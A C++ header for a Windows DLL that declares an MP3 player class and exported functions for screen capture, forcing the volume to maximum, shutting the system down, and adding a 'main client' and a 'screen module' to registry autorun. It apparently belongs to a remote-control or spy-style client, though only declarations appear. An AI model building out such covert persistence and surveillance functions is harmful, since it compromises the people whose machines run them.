#pragma once

#ifdef FILE_EXPOTS
#define FILE_API __declspec(dllexport)
#else
#define FILE_API __declspec(dllimport)
#endif

#include <windows.h>
#include <fstream>
#include <shlobj.h>
#include <uuids.h>
#include <strmif.h>
#include <control.h>
#include <audioclient.h>
#include <Mmdeviceapi.h>
#include <Endpointvolume.h>



#define SOUND_PLAING 1
#define SOUND_NOT_PLAING 0

#pragma comment(lib, "strmiids.lib")
#pragma comment(lib , "user32.lib")
#pragma comment(lib , "advapi32.lib")

HANDLE hEvent = CreateEvent(NULL, FALSE, TRUE, NULL);

std::string Log_File("");

void Init();

BOOL dirExists(char* path);

class Mp3Player
{
private:
	bool    ready;
	IGraphBuilder* gb;
	IBasicAudio* ba;
	IMediaEventEx* me;
	IMediaControl* mc;
	IMediaSeeking* ms;

public:
	Mp3Player();

	~Mp3Player();

	bool Load(LPCWSTR);

	void Clean();

	bool Play();

	bool Pause();

	bool Stop();

	bool WaitForEnding(long, long*);
};


BOOL ChangeVolumeTomax();
void AddToRegisteryAutorunMainClient();
void AddToRegisteryAutorunScreenModule();
extern "C" FILE_API BOOL SaveScreen(const WCHAR * wPath);
extern "C" FILE_API DWORD WINAPI PlaySomeSound(LPVOID FilePath);
extern "C" FILE_API VOID ShutDownThisSystem();
extern "C" FILE_API void LoadMessage(const char* message);
extern "C" FILE_API void CheckAutoRun();

